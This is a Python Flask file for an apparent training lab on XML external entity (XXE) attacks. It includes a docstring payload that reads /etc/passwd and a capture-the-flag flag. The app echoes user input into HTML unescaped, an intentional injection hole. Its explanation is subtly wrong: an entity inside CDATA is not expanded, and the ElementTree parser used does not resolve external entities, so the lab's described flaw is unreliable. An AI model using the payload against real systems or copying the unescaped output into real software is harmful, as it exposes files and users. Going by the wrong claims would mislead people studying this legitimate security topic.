"""
XXE Lab 4: CDATA Bypass XXE
Difficulty: 2 (Intermediate)
Points: 75

Description:
XXE bypassing CDATA restrictions.
"""

from flask import Flask, request
import xml.etree.ElementTree as ET

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    """
    VULNERABLE: CDATA bypass for XXE
    
    Attack Vector:
    <?xml version="1.0"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <foo>
        <![CDATA[
        &xxe;
        ]]>
    </foo>
    
    Or wrapped in element:
    <foo>&xxe;</foo> (entity reference outside CDATA)
    
    Flag: FLAG{xxe_cdata_bypass_004}
    """
    xml_input = request.form.get('xml', '')
    result = None
    error = None
    
    if xml_input:
        try:
            root = ET.fromstring(xml_input)
            result = ET.tostring(root, encoding='unicode')
        except Exception as e:
            error = str(e)
    
    return f"""
    <html>
    <body>
        <h1>CDATA Bypass XXE</h1>
        <form method="POST">
            <textarea name="xml" rows="10" cols="60">{xml_input}</textarea>
            <button>Parse</button>
        </form>
        {f"<pre>{result}</pre>" if result else ""}
        {f"<p style='color:red;'>{error}</p>" if error else ""}
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5004, debug=False)
